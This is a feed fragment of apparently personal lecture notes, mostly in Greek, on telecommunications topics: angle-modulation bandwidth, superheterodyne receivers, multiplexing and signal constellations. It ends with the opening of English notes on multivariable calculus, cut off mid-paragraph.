<h2 id="org4104819"><span class="section-number-2">9.</span> <a href="#org4104819">Κανόνας του Carson και εύρος ζώνης</a></h2>
<div class="outline-text-2" id="text-9">
<p>
Στην διαμόρφωση γωνίας έχουμε θεωρητικά άπειρο εύρος ζώνης, όπως προκύπτει από
την σειρά Taylor:
</p>

\begin{align*}
\label{eq:11}
A_c\cos{\left(\theta(t)\right)} &= A_c\cos{\left(2\pi f_ct\right)}\cos{\left(\phi(t)\right)} - A_c\sin{\left(2\pi f_c t\right)}\sin{\left(\phi(t)\right)}\\
&\stackrel{\text{Taylor}}{=} A_c\cos{\left(2\pi f_c t\right)}[1 - \phi^2(t)/2! + \cdots ] - A_c\sin{\left(2\pi f_c t\right)} [\cdots]
\end{align*}

<p>
Από την παραπάνω έκφραση, καταλαβαίνουμε και επαληθευόμαστε κατα τον μετασχηματισμό Fourier
του διαμορφωμένου σήματος, πως το διαμορφωμένο σήμα έχει εύρος \(nW\), όπου \(n\) η
μεγαλύτερη δύναμη στην οποία υψώνεται η \(\phi\).
</p>

<p>
Από τις σειρές Taylor όμως ξέρουμε ότι \(n \to \infty\):
</p>
\begin{align*}
W' = \lim_{n\to\infty} nW = \infty
\end{align*}

<div class="note" id="org05ad559">
<p>
Αυτή  η προσέγγιση είναι εύκολη μαθηματικά και ίσως βοηθήσει στην κατανόηση.
</p>

</div>
<p>
Στοιχείο που δεν είναι καθόλου πρακτικό για την ανάλυση της διαμόρφωσης γωνίας.
Χρειάζεται μια κάποια πιο ρεαλιστική προσέγγιση, η οποία, επιτρεπόμενη λόγω της
<b>ραγδαίας</b> μείωσης των όρων εκφράζεται από τον <b>κανόνα του Carson</b>:
</p>

<p>
Το εύρος ζώνης \(B\), στο οποίο περιλαμβάνεται τουλάχιστον το \(99%\) της συνολικής
ισχύος δίνεται από την σχέση:
</p>
\begin{equation}
\label{eq:14}
B\approx 2W(\beta+1)
\end{equation}

<p>
Όπου \(\beta\) οι συντελεστές διαμόρφωσης για PM και FM αντίστοιχα.
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Βέβαια ο θόρυβος στο FM είναι εκτός του αντικειμένου αυτού του μαθήματος.
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Στην διάλεξη αυτό επισημάνθηκε σαν γεγονός και όχι σαν υπόθεση.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Διάλεξη 6: Διαμόρφωση γωνίας στενής και ευρείας ζώνης</title>
<link>posts/lectures/auth/tlp1/lec_TLP1_20221025.html</link>
<pubDate>Tue, 25 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/tlp1/lec_TLP1_20221025.html</guid>
<description>
<![CDATA[<div class="note" id="org2a41545">
<p>
Ήταν περισσότερο επανάληψη και λεπτομέρειες επί του προηγούμενου
μαθήματος παρά καινούρια ύλη.
</p>
<ul class="org-ul">
<li>Για αυτό μεγάλο μέρος της διάλεξης δεν επανδημοσιεύτηκε.</li>
</ul>

</div>
<div id="outline-container-org2f40947" class="outline-2">
<h2 id="org2f40947"><span class="section-number-2">1.</span> <a href="#org2f40947">Επανάληψη FM:</a></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>Η πληροφορία πλέον στην γωνία, και ανάλογα με τον τρόπο που μπαίνει εκεί
έχουμε PM ή FM</li>

<li>Ευαισθησία φάσης και συχνότητας: \(K_p,K_f\)</li>

<li>Δείκτης διαμόρφωσης: μέγιστη απόκλιση φάσης ή συχνότητας αντίστοιχα (\(\beta_p,\beta_f\))
<ul class="org-ul">
<li>Προσοχή στην διαμόρφωση συχνότητας έχουμε κανονικοποίηση (διαίρεση με το πλαος)</li>
</ul></li>

<li>διάκριση πεδίου συχνότητας (Fourier) και στιγμιαίας συχνότητας \(f_{i}\), η οποία μας δείχνει
την συχνότητα του σήματος εκείνη την χρονική στιγμή.</li>
</ul>
</div>
</div>
<div id="outline-container-org56fd7c3" class="outline-2">
<h2 id="org56fd7c3"><span class="section-number-2">2.</span> <a href="#org56fd7c3">Παρένθεση σε γραφική παράσταση σημάτων</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Σε PM από τον ορισμό της στιγμιαίας συχνότητας στα σημεία όπου είναι αύξουσα θα
έχεις πύκνωση. Είναι δύσκολο να την καταλάβεις.
</p>
</div>
</div>
<div id="outline-container-orgb2b2ded" class="outline-2">
<h2 id="orgb2b2ded"><span class="section-number-2">3.</span> <a href="#orgb2b2ded">Διαμόρφωση γωνίας στενής και ευρείας ζώνης.</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Στην διαμόρφωση γωνίας, στην περίπτωση που ο δείκτης διαμόρφωσης \(\beta<< 1\)
έχουμε:
</p>

\begin{align}
\label{eq:11}
\beta_{p} &= K_p\max|m(t)| << 1&\text{PM}\\
\beta_{f} &= \frac{K_f}{f_{m}}\max|m(t)| << 1&\text{FM}
\end{align}

<p>
Οπότε, με την ανάλυση του διαμορφωμένου σήματος σε συνιστώσες, και καθώς
\(\beta<<1\Rightarrow\phi(t)<<1\):
</p>

\begin{align}
\label{eq:8}
x(t) &= A_c\cos{2\pi f_ct}\cos{\phi(t)}-A_c\sin{2\pi f_ct}\sin{\phi(t)}  \\
&\stackrel{a\approx0 \Rightarrow \sin{a}=a, \cos{a}=1}{=} A_c\cos{2\pi f_{c}t} - A_c\sin{\left(2\pi f_ct\right)}\phi(t)
\end{align}

<p>
όπου και φαίνεται πως το σήμα μας χωρίζεται σε μία συνιστώσα <i>φέροντος</i> που
θυμίζει DSBAMTC, και σε μία συνιστώσα που θυμίζει DSBAMSC (βέβαια με διαφορά
φάσης \(\frac{\pi}{2}\)).
</p>

<p>
Έχουμε λοιπόν στο πεδίο της συχνότητας:
</p>
\begin{equation}
\label{eq:9}
\mathcal{F}[x(t)] = X(f) = 
\frac{A_c}{2}[\delta(f-f_c) + \delta(f+f_c)] - 
\frac{A_c j}{2}[\Phi(f-f_c)-\Phi(f+f_{c})]
\end{equation}

<p>
Αυτή την διαμόρφωση την λέμε <b>στενής ζώνης (Narrow-Band FM/PM)</b>
</p>
<ul class="org-ul">
<li>NBFM</li>
<li>NBPM</li>
</ul>
</div>
<div id="outline-container-orge67a598" class="outline-3">
<h3 id="orge67a598"><span class="section-number-3">3.1.</span> <a href="#orge67a598">Ευρείας Ζώνης</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
Αν δεν ισχύει βέβαια αυτή η σχέση(\ref{eq:11}) για το \(\beta\) λέμε ότι έχουμε διαμόρφωση
 <b>ευρείας ζώνης, (Wide-band FM/PM)</b>
</p>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Διάλεξη 7: Πολυπλεξία και Υπερετερόδυνος Δέκτης.</title>
<link>posts/lectures/auth/tlp1/lec_TLP1_20221107.html</link>
<pubDate>Mon, 07 Nov 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/auth/tlp1/lec_TLP1_20221107.html</guid>
<description>
<![CDATA[<div id="outline-container-org23a7062" class="outline-2">
<h2 id="org23a7062"><span class="section-number-2">1.</span> <a href="#org23a7062">Πολυπλεξία</a></h2>
<div class="outline-text-2" id="text-1">
<div class="note" id="org0999d24">
<p>
Θα ήταν καλό, όποιος βλέπει αυτές τις σημειώσεις, να ανατρέξει και στην σελίδα
233 των Καραγιαννίδη, Παππή, καθώς το περιεχόμενο αυτής της ενότητας, αν και
όπως αναφέρθηκε στην διάλεξη, φαίνεται να μην καλύπτει τα ίδια με το βιβλίο.
</p>

</div>

<p>
Με τον όρο πολυπλεξία αναφερόμαστε στην διαδικασία κατα την οποία, πάνω από ένα
κοινόχρηστο μέσο, μοιράζουμε ορισμένες ιδιότητες μεταξύ διαφόρων μηνυμάτων,
ούτως ώστε να μπορούν να μεταφερθούν όλα επί εκείνου, φαινομενικά ταυτόχρονα.
</p>

<p>
Υπάρχουν τρεις κυρίαρχες τεχνικές επί τούτου:
</p>
<ul class="org-ul">
<li><b>FDMA</b> (Freq Division Multiple Access): <i>Μοιράζουμε</i> το διαθέσιμο φάσμα συχνοτήτων
σε \(n\) κομμάτια (όπου \(n\) ας πούμε πως είναι τα μηνύματα που θέλουμε να
στείλουμε - προφανώς αυτό είναι ιδανική περίπτωση, καθώς το διαθέσιμο φάσμα
συχνοτήτων είναι περιορισμένο), ούτως ώστε αυτά τα \(n\) κομμάτια πλάτους \(W\) να
μην επικαλύπτονται μεταξύ τους. Έτσι, κατά την διαμόρφωση των μηνυμάτων,
φροντίζουμε, με την κατάλληλη χρήση φέροντων, να αντιστοιχίσουμε τα μηνύματα
με τα frequency slots που έχουμε δημιουργήσει. Παράδειγμα FDMA, προφανώς,
αποτελούν οι ραδιοφωνικοί σταθμοί.</li>
<li><b>TDMA</b> (Time Division Multiple Access): Αντί να μοιράζουμε το φάσμα συχνοτήτων,
μοιράζουμε τον χρόνο κατα τον οποίο μεταδίδεται το κάθε μήνυμα. Εύκολα αυτό
μπορεί να οπτικοποιηθεί σκεπτόμενοι πως το access point μπορεί να εξυπηρετεί
ταυτόχρονα τόσες συσκευές</li>
<li><b>CDMA</b> (Code Division Multiple Access - <i>Δεν καλύφθηκε</i> απλή αναφορά)</li>
</ul>

<p>
Οι δύο τελευταίες τεχνολογίες περιορίζονται, αποκλειστικά, σε ψηφιακά συστήματα.
</p>
</div>
<div id="outline-container-org4195300" class="outline-3">
<h3 id="org4195300"><span class="section-number-3">1.1.</span> <a href="#org4195300">Πολυπλεξία στην συχνότητα</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
Γενικά κινούμαστε μεταξύ των 
</p>
<ul class="org-ul">
<li>AM: 535-1605KHz</li>
<li>FM: 88-108MHz</li>
<li><i>Μετά τα 108MHz -&gt; ILS (instrument landing system)</i></li>
</ul>

<p>
Σε καθ&rsquo;ένα από αυτά τα διαστήματα, έχουμε μικρότερα διαστήματα&#x2026;
</p>


<div id="org2c8a699" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec7_radiospectrum-transportationgov.png" alt="tlp1_lec7_radiospectrum-transportationgov.png">
</p>
<p><span class="figure-number">Figure 1: </span>Photo retrieved from <a href="https://www.transportation.gov/pnt/what-radio-spectrum">the U.S. Department of Transportation</a> on <span class="timestamp-wrapper"><span class="timestamp">&lt;2022-12-04 Sun&gt;</span></span></p>
</div>
</div>
</div>
</div>
<div id="outline-container-org70aa301" class="outline-2">
<h2 id="org70aa301"><span class="section-number-2">2.</span> <a href="#org70aa301">Δέκτες</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Στις προηγούμενες διαλέξεις έχουμε δει το κομμάτι των αποδιαμορφωτών και
διαμορφωτών, αλλά δεν είναι <b>όλες</b> οι τηλεπικοινωνίες. Αγνοήσαμε ένα πολύ
σημαντικό κομμάτι αυτό του πομπού και του δέκτη, μέρος του οποίου αποτελεί το
αντικείμενο της συγκεκριμένης διάλεξης:
</p>
</div>
<div id="outline-container-orgc5f5977" class="outline-3">
<h3 id="orgc5f5977"><span class="section-number-3">2.1.</span> <a href="#orgc5f5977">Ομόδυνος δέκτης</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Αποτελεί, ιστορικά, την πρώτη μορφή δέκτη, η οποία παραγκωνίσθηκε από τον
υπερετερόδυνο δέκτη. Έχει αρχίσει να χρησιμοποιείται ευρέως ξανά, με την άνοδο
του software radio. Είναι εδώ καθαρά εγκυκλοπαιδικά, έμφαση αποκλειστικά στον
SHTR.
</p>
<ul class="org-ul">
<li>Αλλιώς λέγεται και <b>zero-if receiver</b>, <b>direct-conversion receiver</b></li>
</ul>


<div id="orga93278b" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec7_homodyne-amp.png" alt="tlp1_lec7_homodyne-amp.png">
</p>
<p><span class="figure-number">Figure 2: </span>Μια <b>πολύ</b> απλουστευμένη μορφή του ομόδυνου δέκτη, με ενισχυτή και φίλτρα narrow-band</p>
</div>

<p>
Αυτά που ίσχυαν παλιά είναι:
</p>
<ul class="org-ul">
<li>Δουλεύει σε μόνο μία συχνότητα, με πολύ εξειδικευμένο <b>narrow-band</b> φίλτρο και
ενισχυτή (Αυτό μπορεί να αναιρεθεί με την χρήση εν σειρά συντονισμένων
κυκλωμάτων(;)).</li>
<li>Δυσκολία προσδιορισμού/κατασκευής του φίλτρου ωστε να προσεγγιστεί η επιθυμητή
συνάρτηση.</li>
<li>Στις αρχές τουλάχιστον - παραμένει όμως, συγκριτικά με τα φίλτρα και τους
ενισχυτές που δουλεύουν σε πιο χαμηλές συχνότητες (σαν αυτούς που
χρησιμοποιούνται στο HSI SHTR), πιο ακριβή κατασκευή.</li>
<li>Αντικαταστάθηκε από τον υπερετερόδυνο δέκτη</li>
</ul>
</div>
</div>
<div id="outline-container-org85e07d8" class="outline-3">
<h3 id="org85e07d8"><span class="section-number-3">2.2.</span> <a href="#org85e07d8">Υπερετερόδυνος Δέκτης:</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
Ο <i>τύπος</i> δέκτη που μας ενδιαφέρει (SHTR: Super Heterodyne Receiver), λειτουργεί
μετατοπίζοντας το σήμα εισόδου σε μία ενδιάμεση συχνότητα \(f_{if}\), συνήθως
χαμηλή για ευκολότερη κατασκευή φίλτρων και μεγαλύτερη αποδοτικότητα.
</p>

<p>
Στην αρχή το σήμα εισόδου <i>φιλτράρεται</i> μέσα από τον RF ενισχυτή, επιτρέποντας ένα
<i>σχετικά</i> γενναιόδωρο φάσμα γύρω από την \(f_c\). Το σήμα σε αυτό το στάδιο 
πολλαπλασιάζεται με την έξοδο τοπικού ταλαντωτή ώστε να προκύψει σήμα στην
συχνότητα \(f_{if}\) (παράλληλα προκύπτει σήμα σε διαφορετική συχνότητα το οποίο
όμως εύκολα <i>φιλτράρεται</i> από τον IF ενισχυτή μας). Τελικά προκύπτει το σήμα σε
κατάλληλη μορφή ώστε να δοθεί σαν είσοδος σε αποδιαμορφωτή.
</p>

<p>
Βάση της σχέσης \(f_c,f_{if}\) αλλά και της μορφής της \(f_l\), ο υπερετερόδυνος
δείκτης λέμε πως πραγματοποιεί άνω ή κάτω μετατροπή και έγχυση υψηλής ή χαμηλής
ζώνης αντίστοιχα.
</p>


<div id="org4fdabf9" class="figure">
<p><img src="posts/lectures/auth/tlp1/course_tlp1_images/tlp1_lec7_shtr.png" alt="tlp1_lec7_shtr.png">
</p>
<p><span class="figure-number">Figure 3: </span>Διάταξη υπερετερόδυνου δέκτη, περιλαμβάνοντας όλες τις <i>κρίσιμες</i> έννοιες</p>
</div>
</div>
<div id="outline-container-org0cd79e7" class="outline-4">
<h4 id="org0cd79e7"><span class="section-number-4">2.2.1.</span> <a href="#org0cd79e7">Καταλαβαίνοντας την μορφή του σήματος σε κάθε βήμα</a></h4>
<div class="outline-text-4" id="text-2-2-1">
<div class="note" id="org727bb08">
<p>
Ό,τι σημειώνεται για ΑΜ προφανώς ισχύει και για FM, αν και <i>ενδεχομένως</i> με
κάποιες αλλαγές.
</p>

</div>

<p>
Δοθέντος ενός σήματος πληροφορίας \(m(t)\), διαμορφωμένου κατά DSBAM-TC, το οποίο
έρχεται σαν είσοδος από τον RF ενισχυτή μας:
</p>
\begin{equation}
\label{eq:1}
x(t) = [A_c + m(t)]\cos{2\pi f_ct}
\end{equation}

<p>
Πολλαπλασιάζεται με το σήμα του τοπικού ταλαντωτή (στην πραγματικότητα εδώ, για
χάρη απλότητας, φαίνεται μόνο η μία από τις δύο περιπτώσεις. Αναλυτικότερα δες <a href="#org7b0835e">LSI,HSI</a>, \(\ref{eq:4}\)):
</p>

\begin{align}
\label{eq:2}
y(t) &= [A_c + m(t)]\cos{2\pi f_ct}\cos{2\pi f_lt}\\
&= [A_c + m(t)][\cos{2\pi (f_c+f_l)t}+\cos{2\pi (f_c-f_l)t}]
\end{align}

<p>
Σε αυτή την φάση ο όρος \(\cos{2\pi (f_c-f_l)t}\) μπορούμε να θεωρήσουμε πως είναι
της μορφής \(\cos{2\pi f_{if}t}\), επομένως είναι της κατάλληλης μορφής για να
επιτραπεί από το IF φίλτρο:
</p>

\begin{equation}
\label{eq:3}
z(t) = [A_c + m(t)]cos{2\pi f_{if}t}
\end{equation}
</div>
</div>
<div id="outline-container-org6852fd3" class="outline-4">
<h4 id="org6852fd3"><span class="section-number-4">2.2.2.</span> <a href="#org6852fd3">Up and Down Conversion</a></h4>
<div class="outline-text-4" id="text-2-2-2">
<p>
Η άνω ή κάτω μετατροπή <i>αποφασίζεται</i> βάση της σχέσης μεταξύ των \(f_{if},f_c\).
</p>

<p>
Ειδικότερα αν \(f_{if}<f_{c}\) , τότε λέμε πως πρόκειται για κάτω μετατροπή ενώ στην
αντίθετη περίπτωση λέμε οτι έχουμε άνω μετατροπή.
</p>

<p>
Καθώς ο <i>τελικός</i> ενισχυτής και το φίλτρο ακριβείας είναι στην συχνότητα \(f_{if}\),
και γνωρίζουμε πως η αποδοτικότητα αυτών των εξαρτημάτων είναι μεγαλύτερη στις
χαμηλές συχνότητες, <b>συνήθως προτιμάται η κάτω μετατροπή</b>.
</p>
</div>
</div>
<div id="outline-container-org7b0835e" class="outline-4">
<h4 id="org7b0835e"><span class="section-number-4">2.2.3.</span> <a href="#org7b0835e">Low and High Side Injection</a></h4>
<div class="outline-text-4" id="text-2-2-3">
<div class="note" id="orgf15d32d">
<p>
Ένας εύκολος τρόπος να θυμάσαι up/down conversion και LSI/HSI:
</p>
<ul class="org-ul">
<li>Το up/down conversion σχετίζεται με το αν η ενδιάμεση συχνότητα \(f_{if}\) είναι
πάνω ή κάτω από την συχνότητα διαμόρφωσης</li>
<li>Η LSI/HSI σχετίζεται με το αν η συχνότητα του ταλαντωτή είναι πάνω ή κάτω από
την συχνότητα διαμόρφωσης</li>
</ul>

</div>

<p>
Έγχυση υψηλής ή χαμηλής ζώνης έχουμε όταν \(f_l= f_c+f_{if}\) ή \(f_l= f_c-f_{if}\)
αντίστοιχα. Σε αυτές τις περιπτώσεις, επομένως, η εξίσωση \(\eqref{eq:2}\) γίνεται:
</p>

\begin{equation}
\label{eq:4}
y(t) =
\begin{cases}
[A_c + m(t)][\cos{2\pi f_{if}t}+\cos{2\pi (2f_c+f_{if})t}] &\text{HSI}\\
[A_c + m(t)][\cos{2\pi f_{if}t}+\cos{2\pi (2f_c-f_{if})t}] &\text{LSI}
\end{cases}
\end{equation}
</div>
</div>
<div id="outline-container-orgaef975c" class="outline-4">
<h4 id="orgaef975c"><span class="section-number-4">2.2.4.</span> <a href="#orgaef975c">Εικονικό σήμα</a></h4>
<div class="outline-text-4" id="text-2-2-4">
<p>
Αν το φίλτρο RF δεν είναι ρυθμισμένο κατάλληλα, και περάσουν συχνότητες πέραν
του επιθυμητού εύρους ( δηλαδή γύρω από την \(f_c\) που θέλουμε) μπορεί στο βήμα
της \(\eqref{eq:2}\) να εμφανιστούν παρεμβολές στην συχνότητα \(f_{if}\) με
αποτέλεσμα να έχουμε παραμόρφωση του μηνύματος
</p>

<p>
Εύκολο παράδειγμα για αυτό είναι αν περάσει η συχνότητα \(2f_{if}+f_c\) με HSI:
</p>
\begin{equation}
\label{eq:5}
x(t) = [A_c+m_1(t)]\cos{2\pi f_ct} + m_2(t)\cos{2\pi (f_c+2f_{if})t}
\end{equation}
<p>
τότε, μετά τον πολλαπλασιασμό των σημάτων
</p>
\begin{equation}
\label{eq:6}
y(t) = [A_c + m_1(t)][\cos{2\pi f_{if}t}+\cos{2\pi (2f_c+f_{if})t}] + m_{2}(t)[\cos{2\pi f_{if}t}+\cos{2\pi (2f_c+3f_{if})t}] 
\end{equation}

<p>
όπου φαίνεται πως, με την κατάλληλη παραγοντοποίηση εμφανίζεται ο όρος
\(\cos{2\pi f_{if}t}[A_c+m_1(t)+m_2(t)]\), που σημαίνει πως έχουμε παραμόρφωση του
σήματος πληροφορίας.
</p>

<p>
Η ίδια ανάλυση μπορεί να γίνει και για LSI. Λύνεται με ρύθμιση του εύρους του
\(B_{RF}\) ούτως ώστε να είναι αρκετά μικρό και να μην <i>πιάνει</i> αυτές τις
συχνότητες:
</p>
\begin{equation}
\label{eq:7}
f_c + \frac{B_{RF}}{2} < 2f_{if}+f_c\iff \cdots \iff B_{RF} < 4f_{if}
\end{equation}


<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<tbody>
<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">Προβληματική συχνότητα</td>
<td class="org-left">Άνω όριο \(B_{RF}\)</td>
</tr>

<tr>
<td class="org-left">HSI</td>
<td class="org-left">\(f_c+2f_i\)</td>
<td class="org-left">\(4f_{if}\)</td>
</tr>

<tr>
<td class="org-left">LSI</td>
<td class="org-left">\(abs[f_c-2f_i]\)</td>
<td class="org-left">\(4abs[f_{if}-f_c]\)</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Διάλεξη: Σήματα και διανύσματα (?)</title>
<link>posts/lectures/auth/tlp2/lec_TLP2_20230306.html</link>
<pubDate>Mon, 06 Mar 2023 00:00:00 +0200</pubDate>
<guid>posts/lectures/auth/tlp2/lec_TLP2_20230306.html</guid>
<description>
<![CDATA[<ul class="org-ul">
<li>Αναπαράσταση σημάτων ως διανυσμάτων με την αντιστοίχιση τους (κάπου 1960ς)
<ul class="org-ul">
<li>από τους Jacobs, Wozencraft</li>
</ul></li>

<li>Προφανής σύνδεση με διανυσματική άλγεβρα και βάσεις του συστήματος για
καλύτερη κατανόηση και <i>εικονοποίηση</i> των όσων λέγονται.</li>

<li>Και πως αυτό ουσιαστικά εξελίσσεται στην <i>δημιουργία</i> αστερισμών.
<ul class="org-ul">
<li>Αστερισμοί: συνοπτικά σύνολο σημάτων/διανυσμάτων</li>
<li>Οι δύο έννοιες σημάτων και διανυσμάτων θεωρούνται απολύτως <i>όμοιες</i> εδώ.</li>
</ul></li>
</ul>
<div id="outline-container-org0e3523f" class="outline-2">
<h2 id="org0e3523f"><span class="section-number-2">1.</span> <a href="#org0e3523f">Επανάληψη επί της αλγεβρικής θεωρίας</a></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>Cauchy/Schwarz</li>
<li>Μέτρα</li>
<li>Ανεξαρτητοποίηση</li>
<li>Ορθογωνοποίηση Gram-Schmidt.
<ul class="org-ul">
<li>Δες 18.06</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-org3afa9c5" class="outline-2">
<h2 id="org3afa9c5"><span class="section-number-2">2.</span> <a href="#org3afa9c5">Σήματα και διανύσματα - μια αναλογία (και γενικότερη επανάλψη στα σήματα.)</a></h2>
<div class="outline-text-2" id="text-2">
<ul class="org-ul">
<li>Σύνολο πράξεων</li>
<li>Θεμελιώδη σήματα/διανύσματα -&gt; βάσεις</li>
<li>Γραμμική ανεξαρτησία και κατάλληλες πράξεις σε σήματα/διανύσματα.</li>
</ul>

<p>
Συνέχισαν οι κατάλληλοι ορισμοί των διανυσματικών πράξεων (νορμα και εσωτερικό
γινόμενο) σε σήματα.
</p>

<ul class="org-ul">
<li>Συσχέτιση, προβολή, ορθογωνικότητα, ευκλείδεια απόσταση.</li>
</ul>
</div>
</div>
<div id="outline-container-orgb3eba0f" class="outline-2">
<h2 id="orgb3eba0f"><span class="section-number-2">3.</span> <a href="#orgb3eba0f">Αστερισμοί - Constellations</a></h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li>Κάθε σήμα ένα σημείο</li>
<li>Μέση ενέργεια:</li>
</ul>

\begin{equation}
\label{eq:1}
\textsl{E}_s = \sum_{i=1}^M ||s_i||^2 Pr(s_i)
\end{equation}

<p>
μας ενδιαφέρει γιατί ουσιαστικά ταυτίζεται με την μέση κατανάλωση ενέργειας όταν
αναφερόμαστε σε χρήση του εκάστοτε αστερισμού.
</p>


<pre class="example" id="org2ddf354">
- Διαφάνεια 23.
- Η μόνη ερώτηση που θα έκανα εκεί θα ήταν περί της κανονικότητας των βάσεων, καθώς θα μας οφελούσε πολύ να είχαμε πάρει σαν βάσεις μόνο τα:
- $A\cos{\left(2\pi f_ct\right)}$ αντί να έχουμε και τις ρίζες.
</pre>
</div>
<div id="outline-container-org29d6593" class="outline-3">
<h3 id="org29d6593"><span class="section-number-3">3.1.</span> <a href="#org29d6593">Απόσταση, Ενέργεια και Πιθανότητα Σφάλματος.</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
Απόσταση από την αρχή των αξόνων συνεπάγεται μεγαλύτερη η μικρότερη ενέργεια και
εξ&rsquo; αυτού υψηλότερη κατανάλωση.
</p>

<p>
Την ίδια στιγμή εξαιρετικά μικρότερη κατανάλωση συνεπάγεται μεγαλύτερη
πιθανότητα σφάλματος.
</p>

<p>
Συνεδεμένο με αυτό το <b>SPHERE PACING</b>. Δες μάλλον βιβλιογραφία ως προς αυτό.
Κλασσικά συνδέεται με Shannon.
</p>
</div>
</div>
<div id="outline-container-org774639d" class="outline-3">
<h3 id="org774639d"><span class="section-number-3">3.2.</span> <a href="#org774639d">Παραδείγματα αστερισμών:</a></h3>
<div class="outline-text-3" id="text-3-2">
</div>
<div id="outline-container-org4e82f05" class="outline-4">
<h4 id="org4e82f05"><span class="section-number-4">3.2.1.</span> <a href="#org4e82f05">APSK:</a></h4>
<div class="outline-text-4" id="text-3-2-1">
<p>
Amplitude Phase Shift Keying
</p>
<div class="note" id="orgaa70944">
<p>
Συνοπτικά πρόκειται για σύνολο ομοαξονικών κύκλων σταθερής ενέργειας και
διαμοιρασμός των διακριτών σημάτων σε αυτούς τους κύκλους.
</p>

</div>

<ul class="org-ul">
<li>APSK: 16-2 (16 είναι το πλήθος των στοιχείων και το 2 είναι το πλήθος των
ενεργειακών σταθμών που υπάρχουν στον αστερισμό)</li>
<li>Με το ίδιο παράδειγμα στο 16-4 APSK τα 16 σήματα είναι διανεμημένα σε 4
<i>ομο-ενεργειακούς</i> κύκλους.</li>
<li>Δόθηκε το 16-8.</li>
<li>APSK: 64-16
όπως και το 1024-23 δείχνουν πως πυκώνουν αυτές οι διαμορφώσεις και μπορούν να
προκαλέσουν τυχόν σφάλματα λόγω θορύβου.</li>

<li><p>
<b>Μεγαλύτερης τάξης αστερισμοί</b> χρησιμοποιούνται όταν:
</p>
<ul class="org-ul">
<li>SNR είναι ψηλό</li>
<li>(ισοδύναμα) το  κανάλι μας είναι καλό.</li>
</ul>
<p>
Αυτό εδώ αναφέρθηκε ξανά και ξανά και στα επόμενα τμήματα της διάλεξης.
</p></li>
</ul>


<p>
Κατόπιν ερώτησης αναφορικά με την κατάλληλη επιλογή διανυσμάτων/σημείων, ούτως
ώστε τα πιο <i>σημαντικά</i> μας στοιχεία του μηνύματος να έχουν την μικρότερη
πιθανότητα επηρεασμού από τον θόρυβο, τονίστηκε πως δεν ενδιαφερόμαστε σε αυτή
την φάση για κωδικοποιημένη διαμόρφωση.
</p>
</div>
</div>
<div id="outline-container-orgfc15f63" class="outline-4">
<h4 id="orgfc15f63"><span class="section-number-4">3.2.2.</span> <a href="#orgfc15f63">QAM</a></h4>
<div class="outline-text-4" id="text-3-2-2">
<div class="note" id="org3bc2489">
<p>
Ουσιαστικά το επικρατέστερο πρότυπο ψηφιακής διαμόρφωσης σύμφωνα με όσα ειπώθηκαν.
</p>

</div>

<p>
Quadrature amplitude modulation (QAM)
</p>
<ul class="org-ul">
<li>Χρησιμοποιούνται κατα κόρον (αναφέρθηκε πλήθος εφαρμογών. eg 5G)</li>
<li>Υψηλότερης τάξης 1024 χρησιμοποιείται μεταξύ άλλων και στο Wifi 7 ()</li>
</ul>
</div>
</div>
<div id="outline-container-org8d34677" class="outline-4">
<h4 id="org8d34677"><span class="section-number-4">3.2.3.</span> <a href="#org8d34677">HQAM</a></h4>
<div class="outline-text-4" id="text-3-2-3">
<div class="note" id="orgd9f1834">
<p>
Ουσιαστικά σχετική με την QAM αλλά έχουμε διαφορετική <i>σύνδεση</i> των συμβόλων
μεταξύ τους.
</p>

</div>

<p>
Έχει πολύ καλύτερη αποδοτικότητα, από το τετράγωνο της SQAM, και λέγεται έτσι
διότι τα σημεία στο επίπεδο σχηματίζουν μεταξύ τους κανονικά εξάγωνα.
</p>
</div>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Level curves; partial derivatives; tangent plane approximation</title>
<link>posts/lectures/mit/1802/lec_1802_8_20220320_level_curves_partial_derivatives_tangent_plane_approximation.html</link>
<pubDate>Sat, 19 Mar 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/mit/1802/lec_1802_8_20220320_level_curves_partial_derivatives_tangent_plane_approximation.html</guid>
<description>
<![CDATA[<p>
The course, to ensure simplicity, focuses on functions of 2 and 3 variables, but
everything discussed in my notes is applicable to functions of more variables as
well.
</p>

<p>
From geometry to functions of several functions.
</p>
<div id="outline-container-orgebae3a8" class="outline-2">
<h2 id="orgebae3a8"><span class="section-number-2">1.</span> <a href="#orgebae3a8">Introducing multivariable functions</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Think of a random <i>ordinary</i> function of one variable, such as:
</p>
\begin{equation}
f(x) = \sin{x}
\end{equation}

<p>
We have an easy way of dealing with these functions and that is by plotting them
in the form of \(y = f(x)\):
<img src="posts/lectures/mit/1802/../../../images/1802/1802_8_sin.png" alt="1802_8_sin.png">
</p>

<p>
This can not be used, as is, for functions of more variables. It needs a slight
<i>modification</i>, since these functions would not normally be properly plotted on
the plane.
</p>

<p>
